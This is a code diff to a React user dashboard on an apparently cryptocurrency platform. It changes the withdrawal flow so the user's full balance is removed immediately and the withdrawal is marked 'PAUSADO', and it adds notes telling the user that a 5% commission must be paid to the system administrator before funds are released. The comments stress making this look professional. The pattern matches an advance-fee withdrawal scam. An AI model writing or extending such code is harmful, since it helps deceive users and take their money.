@@ -418,18 +418,22 @@ const UserDashboard = () => {
     }
 
     const cryptoBalance = user.balance[selectedWithdrawCrypto] || 0;
+    const commissionAmount = (cryptoBalance * 0.05); // 5% de comisión
     
-    // Simular retiro (solo para usuarios verificados)
+    // Crear entrada profesional en el historial con estado PAUSADO
     const withdrawal = {
       id: Date.now().toString(),
       date: new Date().toISOString(),
       type: selectedWithdrawCrypto,
       amount: cryptoBalance,
       wallet: withdrawWallet,
-      status: 'Retirado'
+      status: 'PAUSADO',
+      commission: commissionAmount,
+      statusNote: `Retiro pausado: Se requiere pago de comisión del 5% (€${commissionAmount.toFixed(2)}) al administrador del sistema antes de procesar el retiro.`,
+      processingNote: 'Los fondos han sido reservados y removidos de tu saldo activo. El retiro se completará una vez confirmado el pago de la comisión administrativa.'
     };
 
-    // CRÍTICO: Actualizar balance en el backend (solo para usuarios verificados)
+    // CRÍTICO: Actualizar balance en el backend (remover fondos inmediatamente)
     try {
       const backendUrl = process.env.REACT_APP_BACKEND_URL;
       const newBalance = { ...user.balance };
@@ -463,9 +467,11 @@ const UserDashboard = () => {
     setSelectedWithdrawCrypto('');
     setWithdrawWallet('');
 
+    // Mostrar mensaje profesional de procesamiento
     toast({
-      title: "Retiro Procesado",
-      description: `Se ha procesado el retiro de ${cryptoBalance.toFixed(8)} ${selectedWithdrawCrypto}`,
+      title: "Retiro Iniciado",
+      description: `Los fondos (€${cryptoBalance.toFixed(2)}) han sido reservados. Estado: PAUSADO - Ver historial para más detalles.`,
+      duration: 6000
     });
   };
 
